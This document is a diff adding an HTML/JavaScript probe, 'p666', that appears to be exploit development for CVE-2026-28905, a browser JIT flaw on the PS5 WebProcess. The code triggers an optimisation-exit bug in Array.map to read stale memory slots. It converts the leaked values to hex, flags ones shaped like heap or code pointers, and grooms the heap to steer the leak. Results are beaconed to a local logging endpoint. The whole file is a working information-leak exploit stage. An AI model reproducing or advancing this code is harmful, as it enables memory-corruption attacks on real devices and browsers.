@@ -1,0 +1,210 @@
+<!--
+  p666: Dump exact values from CVE-2026-28905 stale slots
+  p665 Phase B confirmed: 250 stale NUMBER values in unwritten map slots
+  This probe captures their hex representations to determine if they
+  are heap pointers, structure IDs, or other exploitable data.
+  CRASH_CLASS: LOW
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p666</title></head>
+<body>p666: stale value dump
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=2)flush();}
+function flush(){if(!bQ.length)return;var b=bQ.splice(0,3).join('|');try{var x=new XMLHttpRequest();x.open('GET','/beacon/P666-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,120));flush();};
+var f64=new Float64Array(1),u8=new Uint8Array(f64.buffer);
+function d2hex(d){f64[0]=d;var h='';for(var i=7;i>=0;i--)h+=('0'+u8[i].toString(16)).slice(-2);return h;}
+
+emit('START','v1');flush();
+
+// ================================================================
+// Reproduce p665 Phase B exactly, but DUMP every stale value
+// ================================================================
+try{
+  function triggerOSR(arr, triggerIdx){
+    var callCount=0;
+    var result=arr.map(function(elem){
+      callCount++;
+      if(callCount===triggerIdx) return arguments[2];
+      return elem*2;
+    });
+    return result;
+  }
+
+  // Warm with consistent behavior
+  for(var i=0;i<3000;i++){
+    triggerOSR([1,2,3,4,5,6,7,8,9,10],999);
+  }
+
+  // Collect stale values
+  var allStale=[];
+  for(var trial=0;trial<100;trial++){
+    var exitAt=3+(trial%5);
+    var r=triggerOSR([1,2,3,4,5,6,7,8,9,10],exitAt);
+    for(var j=0;j<r.length;j++){
+      var v=r[j];
+      var expected;
+      if(j<exitAt-1) expected=(j+1)*2; // elem*2
+      else if(j===exitAt-1) expected='arr'; // returned arguments[2]
+      else expected='hole';
+
+      if(expected==='hole'){
+        // This is a post-exit slot — should be hole but might be stale
+        allStale.push({trial:trial,j:j,type:typeof v,
+          hex:typeof v==='number'?d2hex(v):'N/A',
+          val:typeof v==='number'?v:String(v).slice(0,20)});
+      }
+    }
+  }
+
+  emit('TOTAL','stale='+allStale.length);
+
+  // Categorize
+  var nums=allStale.filter(function(x){return x.type==='number';});
+  var objs=allStale.filter(function(x){return x.type==='object';});
+  var undefs=allStale.filter(function(x){return x.type==='undefined';});
+  var others=allStale.filter(function(x){return x.type!=='number'&&x.type!=='object'&&x.type!=='undefined';});
+
+  emit('CATS','nums='+nums.length+',objs='+objs.length+',undef='+undefs.length+',other='+others.length);
+
+  // Dump ALL unique hex values for numbers
+  var hexMap={};
+  for(var k=0;k<nums.length;k++){
+    var h=nums[k].hex;
+    if(!hexMap[h]) hexMap[h]={count:0,first:nums[k]};
+    hexMap[h].count++;
+  }
+
+  var uniq=[];
+  for(var h in hexMap) uniq.push({hex:h,count:hexMap[h].count,val:hexMap[h].first.val,j:hexMap[h].first.j});
+  uniq.sort(function(a,b){return b.count-a.count;});
+
+  emit('UNIQUE','count='+uniq.length);
+  for(var k=0;k<Math.min(uniq.length,30);k++){
+    var u=uniq[k];
+    emit('VAL','0x'+u.hex+' x'+u.count+' j='+u.j+' v='+u.val);
+  }
+
+  // Check for pointer-shaped values
+  var ptrs=uniq.filter(function(x){
+    // PS5 WebProcess heap: 0x000000100XXXXXXX
+    // PS5 text: unknown but likely 0x00007fXXXXXXXXXX or similar
+    var h=x.hex;
+    return h!=='0000000000000000' &&
+           h!=='7ff8000000000000' &&
+           h!=='fff8000000000000' &&
+           (h.slice(0,6)==='000000' || // low heap
+            h.slice(0,4)==='0000' ||   // heap range
+            h.slice(0,4)==='00007');    // text range
+  });
+  emit('PTRS','count='+ptrs.length);
+  for(var k=0;k<Math.min(ptrs.length,10);k++){
+    emit('PTR','0x'+ptrs[k].hex+' x'+ptrs[k].count);
+  }
+
+  // Also dump first 20 raw stale values in order
+  emit('RAW','first 20 stale slots:');
+  for(var k=0;k<Math.min(allStale.length,20);k++){
+    var s=allStale[k];
+    emit('S','t='+s.trial+',j='+s.j+','+s.type+'='+s.hex+'/'+s.val);
+  }
+
+}catch(e){emit('ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// Phase 2: different array content to see if stale values change
+// ================================================================
+emit('P2','vary-content');
+try{
+  function triggerOSR2(arr,triggerIdx){
+    var cc=0;
+    return arr.map(function(e){cc++;if(cc===triggerIdx)return arguments[2];return e*2;});
+  }
+  // Warm
+  for(var i=0;i<3000;i++) triggerOSR2([10,20,30,40,50,60,70,80,90,100],999);
+
+  var stale2=[];
+  for(var trial=0;trial<50;trial++){
+    var r=triggerOSR2([10,20,30,40,50,60,70,80,90,100],4);
+    for(var j=4;j<r.length;j++){
+      var v=r[j];
+      if(typeof v==='number')
+        stale2.push({j:j,hex:d2hex(v),val:v});
+    }
+  }
+
+  var hexMap2={};
+  for(var k=0;k<stale2.length;k++){
+    var h=stale2[k].hex;
+    if(!hexMap2[h])hexMap2[h]={count:0,val:stale2[k].val};
+    hexMap2[h].count++;
+  }
+  var uniq2=[];
+  for(var h in hexMap2) uniq2.push({hex:h,count:hexMap2[h].count,val:hexMap2[h].val});
+  uniq2.sort(function(a,b){return b.count-a.count;});
+
+  emit('P2-UNIQUE','count='+uniq2.length);
+  for(var k=0;k<Math.min(uniq2.length,15);k++)
+    emit('P2-V','0x'+uniq2[k].hex+' x'+uniq2[k].count+' v='+uniq2[k].val);
+}catch(e){emit('P2-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// Phase 3: heap groom then trigger — does stale data change?
+// ================================================================
+emit('P3','groom-then-trigger');
+try{
+  // Allocate objects that put known pointer-shaped data on heap
+  var groom=[];
+  for(var i=0;i<2000;i++){
+    groom.push({a:i,b:[i,i+1],c:function(){return i;}});
+  }
+  // Free half
+  for(var i=0;i<2000;i+=2) groom[i]=null;
+
+  function triggerOSR3(arr,tidx){
+    var cc=0;
+    return arr.map(function(e){cc++;if(cc===tidx)return arguments[2];return e*2;});
+  }
+  for(var i=0;i<3000;i++) triggerOSR3([1,2,3,4,5,6,7,8,9,10],999);
+
+  var stale3=[];
+  for(var trial=0;trial<50;trial++){
+    var r=triggerOSR3([1,2,3,4,5,6,7,8,9,10],4);
+    for(var j=4;j<r.length;j++){
+      var v=r[j];
+      stale3.push({j:j,type:typeof v,hex:typeof v==='number'?d2hex(v):'N/A',val:String(v).slice(0,20)});
+    }
+  }
+
+  var hexMap3={};
+  var types3={};
+  for(var k=0;k<stale3.length;k++){
+    var t=stale3[k].type;
+    types3[t]=(types3[t]||0)+1;
+    if(t==='number'){
+      var h=stale3[k].hex;
+      if(!hexMap3[h])hexMap3[h]={count:0,val:stale3[k].val};
+      hexMap3[h].count++;
+    }
+  }
+  var tstr=[];for(var t in types3) tstr.push(t+':'+types3[t]);
+  emit('P3-TYPES',tstr.join(','));
+
+  var uniq3=[];
+  for(var h in hexMap3) uniq3.push({hex:h,count:hexMap3[h].count,val:hexMap3[h].val});
+  uniq3.sort(function(a,b){return b.count-a.count;});
+  for(var k=0;k<Math.min(uniq3.length,15);k++)
+    emit('P3-V','0x'+uniq3[k].hex+' x'+uniq3[k].count+' v='+uniq3[k].val);
+}catch(e){emit('P3-ERR',e.name+':'+e.message);}
+flush();
+
+emit('DONE','p666-complete');flush();
+})();
+</script>
+</body>
+</html>
